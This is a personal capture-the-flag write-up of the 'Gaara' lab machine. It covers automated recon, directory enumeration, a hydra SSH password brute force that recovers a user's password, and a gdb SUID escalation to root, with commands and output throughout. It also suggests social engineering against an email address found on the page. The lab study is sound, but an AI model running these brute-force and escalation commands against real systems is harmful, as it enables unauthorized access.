Target is 192.168.180.142

I installed auto recon to make recon automated as much as possible.

[https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)

  

sudo env "PATH=$PATH" autorecon 192.168.180.142 

Now to let it do it's thing (Loud as hell on an IDS so pentest only and NOT a redteam strategy!)

  

[*] Scanning target 192.168.180.142

[*] [192.168.180.142/all-tcp-ports] Discovered open port tcp/22 on 192.168.180.142

[*] [192.168.180.142/all-tcp-ports] Discovered open port tcp/80 on 192.168.180.142

[*] [192.168.180.142/tcp/80/http/vhost-enum] The target was not a hostname, nor was a hostname provided as an option. Skipping virtual host enumeration.

[*] [192.168.180.142/tcp/80/http/known-security] [tcp/80/http/known-security] There did not appear to be a .well-known/security.txt file in the webroot (/).

[*] [192.168.180.142/tcp/80/http/curl-robots] [tcp/80/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).

  

So SSH and http web. Checking out the site now.

![](https://lh6.googleusercontent.com/dkmbpxRVHQ1bnN1LJg6jgqxyoz7wk_-dq-CsNTeMI0jccaxTRdFY2lo6bN1PblBNCfzaUA-qsct1T1nZ2zShw9k6QCKwSjOy_zSqcvH6ZzAjh1AdT7PQ72xyOVUZH7Y57A=w1280)

Edgy sand guy from Naruto.

Checking source code

  

<html>

    <title>Gaara</title>

        <img src="gaara.jpg" alt="wallpaper" width="100%" height="100%">

</html>                  

Nothing good

  

There is the email on the page that's kinda hard to read: [dyuuwijaya@yahoo.com](mailto:dyuuwijaya@yahoo.com)

Possible opening for social engineering on broken website and needing FTP access to fix it.

  

Running dirb

Nada

  

Using dirbuster since dirb crashed on me. Also stopped auto recon.

I like how bad dirbuster is with it's UI. Not large enough to show the start button.

Reset the vpn connection and now it's running. Used /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

50 Threads max. Anything more typically breaks connections

  

A search suggests running gobuster. Not my favorite since it requires actual command usage but here it is:

gobuster dir -u http://192.168.240.142 -x txt,php,html --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -o dir.log

  

in the meantime it's worth trying to do a hydra bruteforce on the gaara name since it's the name of the website as well.

  

hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.180.142 ssh

Also I need to keep in mind how many connectiong that the poor server can handle at once between directory discovery and ssh bruteforcing. Reduction of the attack to a sustainable volume is better than a uncapped number with a high failure rate.

  

Time to wait for Hydra to finish bruteforce SSH

Gotem

  

gaara:iloveyou2

I'm in.

Now to check for root privilege escalation via programs with sudo permissions:

find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

gaara@Gaara:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device

-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign

-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb

-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo

-rwsr-sr-x 1 root root 7570720 Dec 24  2018 /usr/bin/gimp-2.10

-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount

-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh

-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn

-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd

-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp

-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su

-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd

-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount

-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount

Now to check against a list of ways to escalate based on unix binaries with sudo privileges: 

  

[https://gtfobins.github.io/](https://gtfobins.github.io/)

  

Alright so gdb has sudo privleges and it's a debugger to run programs so let's escalate to root

gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit

Basically it runs a python bash shell through gdb

- gdb is invoked, a standard debugger on Unix-like systems.
    
- The -nx option tells gdb to not execute any commands from initialization files.
    
- The -ex option is used to specify commands for gdb to execute.
    
- A Python command is executed by gdb, which replaces the current gdb process with a new bash shell process.
    
- The new bash shell process runs with the same privileges as the gdb process.
    
- gdb is instructed to quit.
    

  

gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit

GNU gdb (Debian 8.2.1-2+b3) 8.2.1

Copyright (C) 2018 Free Software Foundation, Inc.

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software: you are free to change and redistribute it.

There is NO WARRANTY, to the extent permitted by law.

Type "show copying" and "show warranty" for details.

This GDB was configured as "x86_64-linux-gnu".

Type "show configuration" for configuration details.

For bug reporting instructions, please see:

<http://www.gnu.org/software/gdb/bugs/>.

Find the GDB manual and other documentation resources online at:

    <http://www.gnu.org/software/gdb/documentation/>.

  

--Type <RET> for more, q to quit, c to continue without paging--c

For help, type "help".

Type "apropos word" to search for commands related to "word".

bash-5.0# ls

flag.txt  local.txt

bash-5.0# cat local.txt 

e1b40069d3f0ce2bd0a20cff39b6a817

bash-5.0# cat flag.txt 

Your flag is in another file...

bash-5.0# cd /

bash-5.0# ls

bin   home            lib32       media  root  sys  vmlinuz

boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old

dev   initrd.img.old  libx32      opt    sbin  usr

etc   lib             lost+found  proc   srv   var

bash-5.0# cd root/

bash-5.0# ls

proof.txt  root.txt

bash-5.0# cat proof.txt 

eeb6dc3dd5c4b9c77483aafb254bd613

bash-5.0# cat root.txt 

Your flag is in another file...

bash-5.0# whoami

root

boot 2 root